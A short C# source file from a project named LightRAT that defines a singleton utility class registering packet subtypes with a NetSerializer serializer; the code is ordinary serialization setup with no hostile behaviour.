using System;
using System.Collections.Generic;
using LightRAT.Network.Packets;
using NetSerializer;

namespace LightRAT
{
    public class LightRATUtils
    {
        private IEnumerable<Type> subtypes;
        public Serializer packetSerializer;

        public static LightRATUtils Instance { get; } = new LightRATUtils();

        public LightRATUtils()
        {
            subtypes = typeof(IPacket).GetSubTypes();
            packetSerializer = new Serializer(subtypes);
        }
    }
}